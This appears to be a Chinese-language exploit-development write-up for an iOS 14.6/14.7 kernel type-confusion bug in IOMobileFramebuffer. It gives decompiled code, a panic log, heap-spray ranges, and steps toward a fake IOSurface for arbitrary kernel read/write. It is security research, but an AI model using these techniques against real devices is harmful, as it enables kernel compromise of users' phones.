IODARTMapper不是一个可以从应用程序沙盒中创建的对象，因此，只能选择IOMFBSwapIORequest。 通过对IOMobileFramebufferUserClient进行逆向分析，可以看到有很多包含swap的外部方法: 1234567External method 4: IOMobileFramebufferUserClient::s_swap_startExternal method 5: IOMobileFramebufferUserClient::s_swap_submitExternal method 6: IOMobileFramebufferUserClient::s_swap_waitExternal method 20: IOMobileFramebufferUserClient::s_swap_signalExternal method 52: IOMobileFramebufferUserClient::s_swap_cancelExternal method 69: IOMobileFramebufferUserClient::s_swap_set_color_matrixExternal method 81: IOMobileFramebufferUserClient::s_swap_cancel_all 可以在应用程序沙盒内访问IOMobileFramebufferUserClient，继续分析 外部方法4：调用IOMobileFramebufferUserClient::s_swap_start时，将会进入IOMobileFramebufferLegacy::swap_start。该函数调用 IOMFBSwapIORequest::create 来分配一个新的IOMFBSwapIORequest对象。在一点初始化之后，新创建的swap的 swap ID被计算出来，并作为这个外部方法的唯一输出传回给我们。因此，可以实现从用户空间创建IOMFBSwapIORequests。 但是，我们无法控制IOMobileFramebufferUserClient::s_swap_start对新创建的IOMFBSwapIORequest的初始化操作。 外部方法5：IOMobileFramebufferUserClient::s_swap_submit的输入参数对任何超过0x280字节的大小，都会报错（至少对于14.6和14.7）。 要 “提交 “的IOMFBSwapIORequest的swap ID是通过结构输入而传递的。在调用 IOMobileFramebufferUserClient::s_swap_submit 之后，我们最终会在 UnifiedPipeline::swap_submit 中结束。这是一个大函数，它将我们的大部分结构输入复制到与我们指定的swap ID相对应的IOMFBSwapIORequest对象。结构输入中没有被直接复制到对象中的部分是像IOSurface ID这样的东西。这些ID被用来推导IOSurface指针，这些指针被写入对象中。这个函数的一个有趣之处在于它从结构输入中读取一个用户空间指针，从该指针和当前任务中创建一个IOBufferMemoryDescriptor对象，然后从该内存中复制0x20c字节到IOMFBSwapIORequest对象，从偏移量0x366开始。所以我们真的有0x280+0x20c字节的控制输入。但由于IOMFBSwapIORequest::create将其分配的IOMFBSwapIORequest清零，这些字节仍然为零，这对漏洞利用开发来说并没有什么区别。 类型混淆的第三个要求：在偏移量0xc0处会有一个非空指针，在偏移量0x3f0处会有一个非空（或NULL）指针。首先，让我们检查一下我们是否对这些字节有控制权，因为这意味着我们将能够自己创造这些条件。恼人的是，这个函数是以这样的方式编译的，很难快速地用眼看到我们是否对偏移量0xc0有控制。尽管如此，我们确实控制了这八个字节。 123456789101112for ( k = 0; k &lt; *(_DWORD *)(found_swap + 356 + 4LL * j); ++k ){ v26 = (int *)(input_swap + 268 + ((__int64)j &lt;&lt; 6)); v27 = v26[4 * k + 1]; v28 = v26[4 * k + 2]; v29 = v26[4 * k + 3]; v30 = (_DWORD *)(found_swap + 113 + ((__int64)j &lt;&lt; 6) + 0x10LL * (int)k); *v30 = v26[4 * k]; v30[1] = v27; v30[2] = v28; v30[3] = v29;} found_swap是我们要提交的IOMFBSwapIORequest，input_swap是我们的结构输入。*(_DWORD *)(found_swap + 356 + 4LL * j)是可控的，但被验证为落在[0, 4]范围内。相反，很容易看到我们也控制了偏移量为0x3f0的8个字节，因为那是0x20c字节区域的一部分，它是由我们在结构输入上提供的用户空间指针复制过来的。 1234567891011121314151617181920if ( (*(found_swap + 868) &amp; 1) != 0 &amp;&amp; *(input_swap + 56) ){ *(found_swap + 869) = 1; v55 = 0LL; address = *(input_swap + 56); task = current_task(); v55 = IOMemoryDescriptor::withAddressRange(address, 0x20CuLL, 3u, task); if ( v55 ) { if ( (v55-&gt;prepare)(v55, 0LL) ) panic(&quot;\\&quot;%s System error: Failure to prepare memory descriptor\\\\n\\&quot;&quot;, &quot;swap_submit&quot;); v54 = -1431655766; v54 = (v55-&gt;readBytes)(v55, 0LL, found_swap + 0x366, 0x20CLL); if ( v54 != 0x20CLL ) panic(&quot;\\&quot;%s System error: Mismatched data size\\\\n\\&quot;&quot;, &quot;swap_submit&quot;); } (v55-&gt;complete)(v55, 0LL); (v55-&gt;release_0)(v55); }} 我们可以控制偏移量为0xc0和0x3f0的指针。如果我们用这个对象输入混淆，那么我们就可以在内核内存的任何地方做32位增量。唯一要弄清楚的是，我们是否能得到一个指向我们提交给UnifiedPipeline对象的IOMFBSwapIORequest对象的指针。这个问题的答案就在UnifiedPipeline::swap_submit的底部。 1v63 = IOMobileFramebufferLegacy::swap_queue(UnifiedPipeline, found_swap); 经过对该函数的逆向分析，发现在UnifiedPipeline对象中，有一个IOMFBSwapIORequest对象的尾队列，从偏移量0xb18开始。最终，IOMobileFramebufferLegacy::queue_move_entry_gated被调用。在它的中间附近，有一个明显的TAILQ_INSERT_TAIL。 1234*(found_swap + 0x630) = 0LL;*(found_swap + 0x638) = UnifiedPipeline_swap_tailq_B18-&gt;tqe_last;*UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = found_swap;UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = (found_swap + 0x630); 由于TAILQ_HEAD宏将tqe_last初始化为指向tqe_first的地址，第三行将found_swap写到UnifiedPipeline对象的偏移量0xb18。因此，每次我们成功调用IOMobileFramebufferUserClient::s_swap_submit时，我们可以指望一个指向结构输入中指定的交换的指针出现在UnifiedPipeline对象的偏移量0xb18处。 有了到目前为止我们所知道的一切，我们应该能够通过以下步骤来增加32位的内核内存: 用IOMobileFramebufferUserClient::s_swap_start创建一个新的IOMFBSwapIORequest。 使用IOMobileFramebufferUserClient::s_swap_submit来获取在步骤1中创建的IOMFBSwapIORequest对象的偏移量0xc0和0x3f0的受控字节。0xc0将是我们提供的内核指针，0x3f0将是NULL。该交换对象的指针将被写入UnifiedPipeline对象的偏移量0xb18。 调用 IOMobileFramebufferUserClient::s_displayed_fb_surface 的越界下标16，因为0xb18 - 0xa98是0x80，而 0x80/sizeof(IOMFBSwapIORequest *) 是16。我们将进入IOSurfaceSendRight::init，oob_surface指向IOMFBSwapIORequest对象，IOSurface::increment_use_count将愉快地增加该交换的八个受控字节在偏移量0xc0所指向的32位。 0xa98是IOSurface数组的偏移量，我们可以从它那里越界读。 通过在swap的偏移量0xc0处放置一个类似0x41414142424的指针来测试这个方法。如果内核在OSIncrementAtomic中解除对它的引用，那么我们就成功了。 123456789101112131415161718{&quot;bug_type&quot;:&quot;210&quot;,&quot;timestamp&quot;:&quot;2021-11-03 13:06:45.00 -0400&quot;,&quot;os_version&quot;:&quot;iPhone OS 14.6 (18F72)&quot;,&quot;incident_id&quot;:&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;}{ &quot;build&quot; : &quot;iPhone OS 14.6 (18F72)&quot;, &quot;product&quot; : &quot;iPhone10,4&quot;, &quot;kernel&quot; : &quot;Darwin Kernel Version 20.5.0: Sat May 8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\\/RELEASE_ARM64_T8015&quot;, &quot;incident&quot; : &quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;, &quot;crashReporterKey&quot; : &quot;1db1b5662483938458430f8a3af5439dc5f1064d&quot;, &quot;date&quot; : &quot;2021-11-03 13:06:45.03 -0400&quot;, &quot;panicString&quot; : &quot;panic(cpu 2 caller 0xfffffff028aff2d4): Unaligned kernel data abort. at pc 0xfffffff0289b230c, lr 0xfffffff028e5409c (saved state: 0xffffffe8045eb380) x0: 0x4141414142424256 x1: 0x0000000000000000 x2: 0xfffffff0289b4fac x3: 0x0000000000000000 x4: 0x0000000000000000 x5: 0x0000000000000000 x6: 0x0000000000000000 x7: 0x0000000000000330 x8: 0x0000000000000001 x9: 0x0000000000000001 x10: 0x0000000000000002 x11: 0xffffffe4cc2ca458 x12: 0x0000000000000001 x13: 0x0000000000000002 x14: 0xffffffe19cc1a920 x15: 0x0000000000000003 x16: 0x0000000000000000 x17: 0x000000000000000f x18: 0xfffffff028aed000 x19: 0xffffffe4cc2ca450 x20: 0x0000000000000001 x21: 0x0000000000000000 x22: 0xffffffe4cc1a0860 x23: 0x00000000e00002c2 x24: 0x0000000000000000 x25: 0xffffffe8045ebaec x26: 0xffffffe4cd7601f0 x27: 0xffffffe4cd80ebf4 x28: 0x0000000000000000 fp: 0xffffffe8045eb6e0 lr: 0xfffffff028e5409c sp: 0xffffffe8045eb6d0 pc: 0xfffffff0289b230c cpsr: 0x60400204 esr: 0x96000021 far: 0x4141414142424256 为什么x0不是0x41414142424242，是因为IOSurface::increment_use_count在它传递给OSIncrementAtomic的指针上增加了0x14。 oob_surface-&gt;surface_id存在的问题每次用IOMobileFramebufferUserClient::s_displayed_fb_surface做增量时，都会通过其标量输出返回一个Mach端口名称。在内核中，这个端口是由一个IOSurfaceSendRight对象支持的。IOSurfaceSendRight是一个小对象，通常携带一个指向IOSurface的指针。但对我们来说，这将是一个指向 IOMFBSwapIORequest 对象的指针，为了简单起见，从现在起将这些端口称为 “swap端口”。 当我们在这里处理端口时，99%的IOSurface kext都在处理ID。更大的情形是这样的：每个IOSurfaceRootUserClient客户端都维护它自己的IOSurfaceClient对象数组。IOSurface ID实际上只是该数组的一个索引。如果某个索引的IOSurfaceClient指针是NULL，那么这个索引就被认为是一个自由的IOSurface ID。IOSurfaceClient对象是携带一个指向IOSurface的指针。这可以用一行代码来总结。 1IOSurface *surface = IOSurfaceRootUserClient-&gt;surface_client_array[surface_id]-&gt;surface; 绿色方框代表结构字段。IOSurfaceRootUserClient的IOSurfaceClient指针数组在偏移量0x118，IOSurfaceClient对象的IOSurface指针在偏移量0x40。 对于这个kext的99%来说，如果某个IOSurface ID没有IOSurfaceClient对象，那么这个ID对应的IOSurface对象就可能不存在。而这正是我们的问题–我们只有一个端口。幸运的是，IOSurfaceRootUserClient的外部方法34，IOSurfaceRootUserClient::s_lookup_surface_from_port，旨在解决这个问题。它接收一个由IOSurfaceSendRight对象支持的Mach端口，并吐出一个IOSurface ID，以及许多其他的字节，我不知道其目的是什么。 我的第一个想法是使用IOSurfaceRootUserClient::s_lookup_surface_from_port来获得一个swap端口的ID。然后我就用这个ID和其他IOSurfaceRootUserClient的外部方法结合起来，尝试泄露IOSurface的指针，这些指针被写到IOMobileFramebufferUserClient::s_swap_submit里面的交换对象。 当调用IOSurfaceRootUserClient::s_lookup_surface_from_port与一个swap端口时，它将意识到没有IOSurfaceClient对象存在，而这个对象是连接到支持的IOSurfaceSendRight对象的IOMFBSwapIORequest。因此，一个新的IOSurfaceClient对象将被分配，IOSurfaceClient::init将被调用。 12345678910111213141516171819202122232425262728293031__int64 __fastcall IOSurfaceClient::init_IOSurfaceRootUserClient___IOSurface___bool( IOSurfaceClient *a1, IOSurfaceRootUserClient *iosruc, IOSurface *oob_surface, char a4){ /* ... */ a1-&gt;m.surface = oob_surface; /* ... */ a1-&gt;m.surface_id = 0; a1-&gt;m.user_client = iosruc; /* ... */ if ( !IOSurfaceRootUserClient::set_surface_handle(iosruc, a1, oob_surface-&gt;surface_id) ) return 0LL; a1-&gt;m.surface_id = oob_surface-&gt;surface_id; /* ... */ surface = a1-&gt;m.surface; field_B8 = surface-&gt;field_B8; v13 = field_B8 | (((*(*surface-&gt;qword38 + 0xA8LL))(surface-&gt;qword38) == 2) &lt;&lt; 12) | 0x4000001; /* ... */ return v16;} 就像IOSurfaceSendRight::init一样，oob_surface指向一个IOMFBSwapIORequest对象。对IOSurfaceRootUserClient::set_surface_handle的调用正是为了使新的IOSurfaceClient对象在IOSurface kext中可见。 12345678910111213141516171819202122__int64 IOSurfaceRootUserClient::set_surface_handle( IOSurfaceRootUserClient *iosruc, IOSurfaceClient *iosc, __int64 wanted_handle){ if ( wanted_handle &amp;&amp; iosruc-&gt;m.surface_client_array_capacity &gt; wanted_handle ) goto LABEL_4; result = IOSurfaceRootUserClient::alloc_handles(iosruc); if ( result ) {LABEL_4: surface_client_array = iosruc-&gt;m.surface_client_array; if ( surface_client_array[wanted_handle] ) panic( &quot;\\&quot;IOSurfaceRootUserClient::set_surface_handle asked to set handle %08x that was not free: %p\\&quot;&quot;, wanted_handle, iosruc-&gt;m.surface_client_array[wanted_handle]); surface_client_array[wanted_handle] = iosc; return 1LL; } return result;} 如果这个函数成功，一个带有指向IOMFBSwapIORequest的指针的IOSurfaceClient对象将被注册在IOSurfaceRootUserClient对象的IOSurfaceClient数组内，该对象被用于调用IOSurfaceRootUserClient::s_lookup_surface_from_port。还有最后一个问题：wanted_handle参数的值是什么？因为它来自oob_surface-&gt;surface_id，让我们检查surface_id的偏移量（x20是oob_surface）。 1234LDR W2, [X20,#0xC] ; a3MOV X0, X21 ; a1MOV X1, X19 ; iosrucBL IOSurfaceRootUserClient__set_surface_handle 所以IOSurface的surface_id是偏移量为0xc处的32位值。我们能控制IOMFBSwapIORequest对象上偏移量0xc处的32位值吗？不能，因为 IOMFBSwapIORequest::create 会将新的 IOMFBSwapIORequest 对象清零。那么如果它是零呢？这不还是一个有效的ID吗？答案又是否定的，因为IOSurface的ID是从1开始的。零被认为是一个无效的ID。 IOSurfaceClient::init也有一个问题，就是靠近底部的虚函数调用。 12345678910a1-&gt;m.surface = oob_surface;/* ... */surface = a1-&gt;m.surface;field_B8 = surface-&gt;field_B8;/* ... */v13 = field_B8 | (((*(*surface-&gt;qword38 + 0xA8LL))(surface-&gt;qword38) == 2) &lt;&lt; 12) | 0x4000001; 如果我们想让IOSurfaceClient::init返回一个成功代码，这个调用是不可避免的。虽然我们确实控制了偏移量0x38的八个字节（这就是qword38所代表的），但我们没有办法伪造vtable指针的PAC。 看起来利用IOSurfaceRootUserClient::s_lookup_surface_from_port来获取一个swap端口的IOSurface ID是不可能的了。 猜测游戏zone map并不是唯一可以在内核中进行控制分配的地方。kalloc系列函数有一些非常好的东西：如果分配的大小太大，无法放入任何zone，那么就会从zone map之外返回内存。所有的kalloc变体都会调用kalloc_ext，它首先会根据传入的分配大小选择区域。 1234567891011121314151617181920struct kalloc_resultkalloc_ext( kalloc_heap_t kheap, vm_size_t req_size, zalloc_flags_t flags, vm_allocation_site_t *site){ vm_size_t size; void *addr; zone_t z; size = req_size; z = kalloc_heap_zone_for_size(kheap, size); if (__improbable(z == ZONE_NULL)) { return kalloc_large(kheap, req_size, size, flags, site); } /* ... */} 如果传递给它的大小大于kalloc_max_prerounded，kalloc_heap_zone_for_size将返回ZONE_NULL。对于iOS 14.6和iOS 14.7，kalloc_max_prerounded是32769字节，因为任何kheap中最大的区域是用于分配高达32768字节的数据。因此，为了使kalloc_heap_zone_for_size返回ZONE_NULL并进入kalloc_large，我们只需要分配大于32768字节的东西。 下面是kalloc_large部分代码: 123456789101112131415161718192021222324252627282930313233343536__attribute__((noinline))static struct kalloc_resultkalloc_large( kalloc_heap_t kheap, vm_size_t req_size, vm_size_t size, zalloc_flags_t flags, vm_allocation_site_t *site){ int kma_flags = KMA_ATOMIC; vm_tag_t tag; vm_map_t alloc_map; vm_offset_t addr; /* ... */ size = round_page(size); alloc_map = kalloc_map_for_size(size); /* ... */ if (kmem_alloc_flags(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) { if (alloc_map != kernel_map) { if (kmem_alloc_flags(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) { addr = 0; } } else { addr = 0; } } /* ... */ return (struct kalloc_result){ .addr = (void *)addr, .size = req_size };} kalloc_map_for_size只是根据大小来选择适当的地图进行分配。 12345678static inline vm_map_tkalloc_map_for_size(vm_size_t size){ if (size &lt; kalloc_kernmap_size) { return kalloc_map; } return kernel_map;} 在iPhone 8和iPhone SE上，kalloc_kernmap_size是0x100001字节。因此，通过调用大于32768字节的东西，我们可以忽略Kheap隔离和封存，并从kalloc地图或内核地图中进行分配。真是一种解脱…… kalloc_large调用kmem_alloc_flags，kmem_alloc_flags尾部调用kernel_memory_allocate。 kernel_memory_allocate通过调用vm_map_find_space在传递给它的vm_map中找到空间。真正重要的是vm_map_find_space如何找到空闲内存。 1234567891011121314151617181920212223242526272829303132333435kern_return_tvm_map_find_space( vm_map_t map, vm_map_offset_t *address, /* OUT */ vm_map_size_t size, vm_map_offset_t mask, int flags, vm_map_kernel_flags_t vmk_flags, vm_tag_t tag, vm_map_entry_t *o_entry) /* OUT */{ vm_map_entry_t entry, new_entry, hole_entry; vm_map_offset_t start; vm_map_offset_t end; /* ... */ new_entry = vm_map_entry_create(map, FALSE); vm_map_lock(map); if (flags &amp; VM_MAP_FIND_LAST_FREE) { /* ... */ } else { if (vmk_flags.vmkf_guard_after) { /* account for the back guard page in the size */ size += VM_MAP_PAGE_SIZE(map); } /* * Look for the first possible address; if there's already * something at this address, we have to start after it. */ /* ... */} “寻找第一个可能的地址 “表明，如果我们在zone map之外进行大量分配，它们最终不仅会被连续布置，而且会按照我们分配的顺序布置。对我们来说，VM_MAP_FIND_LAST_FREE不会被设置为标志，因为那是专门为kheap区域分配新的虚拟内存的选项。 我们应该对内核喷洒什么呢？在Siguza的v0rtex的文章中，大于一页的OSData缓冲区会直接进入内核地图，但那是近四年前的事了。我自己检查了一下，看看从那时起是否有什么变化，在我的内核中追踪到OSData::initWithCapacity后，情况仍然如此。 123456789101112131415161718192021__int64 __fastcall OSData::initWithCapacity_unsigned_int(__int64 a1, unsigned int capacity){ /* ... */ if ( page_size &gt; capacity ) { v6 = kalloc_ext(&amp;KHEAP_DATA_BUFFERS, capacity, 0LL, &amp;unk_FFFFFFF009260880); /* ... */ goto LABEL_11; } if ( capacity &lt; 0xFFFFC001 ) { v8 = (capacity + 0x3FFF) &amp; 0xFFFFC000; /* ... */ kernel_memory_allocate(kernel_map, &amp;v11, v8, 0LL, 0LL, v9); }} 因此，只要我们的分配超过了一个页面，并且不是过分的大，我们就可以把受控的数据放入内核地图。而为了进行OSData分配，我们将利用OSUnserializeBinary。这个函数已经存在很久很久了，这里有大量关于其输入数据格式的文档。IOSurfaceRootUserClient外部方法9，即IOSurfaceRootUserClient::s_set_value，使用OSUnserializeBinary来解析其结构输入数据，所以我们可以用它来进行分配。我们还可以用IOSurfaceRootUserClient::s_get_value读回数据，或者用IOSurfaceRootUserClient::s_remove_value释放数据。 喷洒500MB的OSData缓冲区，原因有二：第一，做500MB的分配不需要那么长的时间，第二，做那么多的分配，在某个时间点之后，几乎可以保证可预测和连续的分配。使用xnuspy，钩住kernel_memory_allocate，检查它是否被OSData::initWithCapacity调用。如果是的话，把它刚刚分配的页面的地址记录在一个全局数组中。由于xnuspy从可执行文件的__TEXT和__DATA段中创建了共享内存，对这个数组的写入对用户空间代码来说是可见的。喷洒结束后，对该数组内的分配进行了排序，并检查是否有任何漏洞。忽略前1000个分配，因为在那之后我们很有可能只看到连续的、按顺序的分配。如果没有漏洞，就记录下这个范围，在重启后再做几次，得出了iPhone 8的以下范围。 123456[0xffffffe8cee1c000, 0xffffffe8ec458000)[0xffffffe8cef78000, 0xffffffe8ec5b0000)[0xffffffe8ce9b4000, 0xffffffe8ebff4000)[0xffffffe8cef38000, 0xffffffe8ec570000)[0xffffffe8cead4000, 0xffffffe8ec10c000)[0xffffffe8ccdec000, 0xffffffe8ec378000) 算出每个范围的平均数，把它们加到一个列表中，然后取这个列表的平均数来得出我们猜测的内核map指针。对于运行iOS 14.6的iPhone 8来说，这个指针是0xffffffe8dd594000，而且出奇地可靠。但是，iOS 14.7的iPhone SE是另一个故事。那部手机的地址空间被诅咒了。不确定是什么原因导致了这种奇怪的现象，但还是能够得出一个猜测：0xfffff9942d0000。这个猜测有大约50%的成功率，而iPhone 8的猜测则倾向于90%。 你可以在这里找到kernel_memory_allocate的钩子，在这里找到分析全局数组的代码，在这里找到生成猜测的python脚本。 漏洞利用Stage 0有了一个用于32位增量的指针，我开始思考这个漏洞的最终目标是什么，因为它不会是一个假的内核任务端口。用一个假的IOSurface对象代替怎么样？如果IOSurface::increment_use_count在偏移量0xc0处读出一个指针来增加 “使用次数”，我想是否有一个IOSurfaceRootUserClient的外部方法来读取这个 “使用次数”……哦，看，有的。 12345678910111213141516171819202122kern_return_t __fastcall IOSurfaceRootUserClient::get_surface_use_count( IOSurfaceRootUserClient *a1, unsigned int a2, _DWORD *a3){ v6 = 0xE00002C2; lck_mtx_lock(a1-&gt;m.mutex); if ( a2 ) { if ( a1-&gt;m.surface_client_array_capacity &gt; a2 ) { v7 = a1-&gt;m.surface_client_array[a2]; if ( v7 ) { v6 = 0; *a3 = IOSurfaceClient::get_use_count(v7); } } } lck_mtx_unlock(a1-&gt;m.mutex); return v6;} IOSurfaceClient::get_use_count: 1234_DWORD __fastcall IOSurfaceClient::get_use_count(IOSurfaceClient *a1){ return IOSurface::get_use_count(a1-&gt;m.surface);} IOSurface::get_use_count: 1234_DWORD __fastcall IOSurface::get_use_count(IOSurface *a1){ return *(_DWORD *)(a1-&gt;qwordC0 + 0x14LL);} 如果我们控制一个IOSurface对象，我们就控制了内核指针的偏移量0xc0。因此，通过调用这个IOSurfaceRootUserClient::s_get_surface_use_count与一个被控制的IOSurface，我们会有一个任意的32位内核读取。但是一个任意的写呢？这个位于偏移量0xc0的指针似乎有很大的意义。 1234567891011121314151617181920kern_return_t __fastcall IOSurfaceRootUserClient::set_compressed_tile_data_region_memory_used_of_plane( IOSurfaceRootUserClient *a1, unsigned int a2, __int64 a3, __int64 a4){ v8 = 0xE00002C2; lck_mtx_lock(a1-&gt;m.mutex); if ( a2 ) { if ( a1-&gt;m.surface_client_array_capacity &gt; a2 ) { v9 = a1-&gt;m.surface_client_array[a2]; if ( v9 ) v8 = IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane(v9, a3, a4); } } lck_mtx_unlock(a1-&gt;m.mutex); return v8;} IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane: 1234567kern_return_t __fastcall IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane( IOSurfaceClient *a1, unsigned int a2, int a3){ return IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane(a1-&gt;m.surface, a2, a3);} IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane: 12345678910kern_return_t __fastcall IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane(IOSurface *a1, unsigned int a2, int a3){ result = 0xE00002C2; if ( a2 &lt;= 4 &amp;&amp; a1-&gt;dwordB0 &gt; a2 ) { result = 0; *(_DWORD *)(a1-&gt;qwordC0 + 4LL * a2 + 0x98) = a3; } return result;} 我们同时控制了a2和a3，所以如果我们控制传递给这个函数的IOSurface对象，我们就有了一个任意的32位内核写入。 还记得每个IOSurfaceRootUserClient是如何跟踪它所拥有的IOSurface对象的吗？每一次从IOSurfaceClient数组中的读取都是在边界检查的保护下进行的。如果我们以某种方式泄露了我们拥有的IOSurfaceRootUserClient的地址，我们可以使用类型混淆的32位增量来提高其surface_client_array_capacity字段。这将人为地创造一个越过其surface_client_array末端的越界读取，所以我们可以索引到一个我们控制的缓冲区。 因此，这个漏洞的目标是构建一个假的IOSurfaceClient对象（它将携带一个指向假的IOSurface对象的指针），我们可以使用IOSurfaceRootUserClient外部方法对其进行索引。 Stage 1: 塑形内核VA第一阶段的目标是创建一个可预测的大型IOSurfaceClient数组的布局，并控制缓冲区极其接近OSData缓冲区，该缓冲区与我们猜测的内核指针相对应。很明显，我们需要在其他事情之前找到这个OSData缓冲区。选择0x10000字节的分配对内核map喷洒500MB数据，因为我们将在喷射IOSurfaceClient数组时使用这个大小。这个大小是任意选择的，没有什么意义。然而，根据特定启动的内核map碎片，猜测不会总是落在0x10000字节的OSData缓冲区的第一页。因此，对于每个OSData缓冲区的每一页。 偏移量0x0保持一个常数。 偏移量0X4保存页面编号。 偏移量0x8持有用于IOSurfaceRootUserClient外部方法9、10和11的密钥。 在500MB被喷完后，猜测的内核指针被使用，并有32位增量。如果猜测落在一个未映射的页面上，就会导致Panic，但如果它落在我们的一个已喷涂的缓冲区上，那么这些页面开始的那个常量值就会被递增了。我们用IOSurfaceRootUserClient::s_get_value读回所有的OSData缓冲区，并检查这个变化。一旦我们找到被写入的缓冲区的页面，我们就用偏移量0x4的页码来计算第一个页面的地址。 从现在开始，将把与我们猜测的内核指针相对应的OSData缓冲区称为 “锚点分配”。 我们现在处于一个非常好的位置。我们知道锚点分配在内核内存中的地址，并且由于vm_map_find_space的可预测性，这些OSData缓冲区极有可能按照它们被分配的顺序排列。这就是在这个漏洞中最依赖的东西。因为知道锚点分配的地址，所以知道与它相邻的所有OSData缓冲区的地址。如果想要左边的第n个OSData缓冲区，那么就从锚点分配的地址中减去0x10000*n字节。如果我想把第n个OSData缓冲区放在右边，那么我就把0x10000*n字节加到锚点分配的地址上。 此外，如果我们释放了一个OSData缓冲区，我们应该能够很容易地收回那个缓冲区，因为vm_map_find_space的 “寻找第一个可能的地址 “的思想。 如果逆向过IOSurface kext，或者看过内核日志，可能知道每个IOSurfaceRootUserClient有4096个IOSurface对象的限制。一旦我们达到了一个IOSurfaceRootUserClient的限制，我们就可以创建另一个，并继续用新的IOSurface对象。同样，对于我们创建的每一个IOSurface对象，都会有一个IOSurfaceClient对象。但是，即使我们创建了4096个IOSurface对象，sizeof(IOSurfaceClient *) * 4096也只有0x8000字节，而不是0x10000字节。那么是什么原因呢？ 原因在IOSurfaceRootUserClient::alloc_handles里: 123456789101112131415161718__int64 IOSurfaceRootUserClient::alloc_handles(IOSurfaceRootUserClient *a1){ surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity; surface_client_array = a1-&gt;m.surface_client_array; /* ... */ v5 = IONewZero(8 * surface_client_array_capacity); a1-&gt;m.surface_client_array = v5; if ( v5 ) { a1-&gt;m.surface_client_array_capacity = surface_client_array_capacity; /* ... */ } /* ... */} IOSurfaceRootUserClient::set_surface_handle是由IOSurfaceClient::init调用的，所以每次我们创建一个新的IOSurface对象时都会到达IOSurfaceRootUserClient::alloc_handles。 正是这一行使0x10000字节的IOSurfaceClient阵列成为可能: 1surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity; provider字段指向一个IOSurfaceRoot对象。创建的每个IOSurfaceRootUserClient对象都有相同的provider指针。那么，在创建一个新的IOSurface时，IOSurfaceRoot是如何发挥作用的？当你创建一个IOSurface时，首先要调用的一个函数是IOSurface::init。为了分配一个新的IOSurface ID，它调用IOSurfaceRoot::alloc_surfaceid。 1234567891011121314151617181920212223__int64 __fastcall IOSurfaceRoot::alloc_surfaceid(IOSurfaceRoot *a1, unsigned int *new_surface_idp){ /* ... */ v4 = a1-&gt;m.total_surfaces_created &gt;&gt; 5; while ( v4 &gt;= a1-&gt;m.surface_client_array_capacity &gt;&gt; 5 ) {LABEL_7: if ( (IOSurfaceRoot::alloc_handles(a1) &amp; 1) == 0 ) { v9 = 0LL; goto LABEL_15; } } /* ... */ v6 = 32 * v4; /* aka v6 = v4 &lt;&lt; 5 */ a1-&gt;m.total_surfaces_created = v6 + 1; *new_surface_idp = v6; /* ... */} 为什么这个代码库将创建的IOSurface对象的总数移到左边五位，尚不明白，但我们看到IOSurfaceRoot有自己的alloc_handles实现。 1234567891011121314151617181920212223242526__int64 __fastcall IOSurfaceRoot::alloc_handles(IOSurfaceRoot *a1){ surface_client_array_capacity = a1-&gt;m.surface_client_array_capacity; if ( surface_client_array_capacity ) { if ( surface_client_array_capacity &gt;&gt; 14 ) return 0LL; v3 = 2 * surface_client_array_capacity; } else { v3 = 512; } /* ... */ v6 = IONewZero((v3 &gt;&gt; 3) + 8LL * v3); if ( v6 ) { a1-&gt;m.surface_client_array_capacity = v3; /* ... */ } /* ... */} 因此，全系统有一个16384个IOSurface对象的限制，这就是surface_client_array_capacity &gt;&gt; 14的测试。对于超过512的2次方，IOSurfaceRoot的surface_client_array_capacity将增加一倍。因为我们创建的每个IOSurfaceRootUserClient都有相同的IOSurfaceRoot指针，他们都能在IOSurfaceRootUserClient::alloc_handles看到相同的surface_client_array_capacity字段。 因此，我们创建0x10000字节的IOSurfaceClient数组的方法很简单：创建两个IOSurfaceRootUserClient对象，并为它们各自分配4096个IOSurface对象。如果我们特别注意不触发他们的provider IOSurfaceRoot的surface_client_array_capacity的再次翻倍，那么未来任何新的IOSurfaceRootUserClient对象的所有IOSurfaceClient数组也将是0x10000字节。这里最棒的是，我们需要做的就是用一个新的IOSurfaceRootUserClient对象来做一个新的0x10000字节的IOSurfaceClient数组，只需要用它来分配一个IOSurface，因为在那个时候，IOSurfaceRoot的surface_client_array_capacity已经是8192。 尽管0x10000比kalloc_max_prerounded大，但有一个小问题：OSData缓冲区是由kernel_memory_allocate直接分配的，而IOSurfaceClient数组的分配是通过kalloc_ext的，所以会调用kalloc_large。还记得kalloc_large如何调用kalloc_map_for_size吗？ 12345678static inline vm_map_tkalloc_map_for_size(vm_size_t size){ if (size &lt; kalloc_kernmap_size) { return kalloc_map; } return kernel_map;} kalloc_kernmap_size又是0x100001字节，但我们要做的IOSurfaceClient数组只有0x10000字节，所以我们要从kalloc map而不是直接从内核map中分配。 12345678910111213alloc_map = kalloc_map_for_size(size);/* ... */ if (kmem_alloc_flags(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) { if (alloc_map != kernel_map) { if (kmem_alloc_flags(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) { addr = 0; } } else { addr = 0; }} 所以我们只需要让从kalloc地图的分配失败，落入第二个kmem_alloc_flags，它将永远从内核地图分配。让未来的kalloc地图分配失败的最好方法是把它完全填满。 为了填满kalloc地图，我们将使用携带线外端口的Mach消息。这是在iOS 13及以下版本中最过硬的策略之一，因为你可以得到一个Mach端口指针数组，放置在你想要的任何区域。尽管这在iOS 14及以上版本中已经失效，但port指针数组的分配仍然要通过kalloc_ext。经过一些测试，喷洒2000条携带8192个发送权的消息，始终能填满kalloc地图，因为消息中的每个发送权都会创建一个ipc_port指针。 